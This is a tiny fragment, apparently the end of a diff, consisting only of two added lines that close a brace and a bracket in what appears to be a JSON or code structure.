+  }
+]
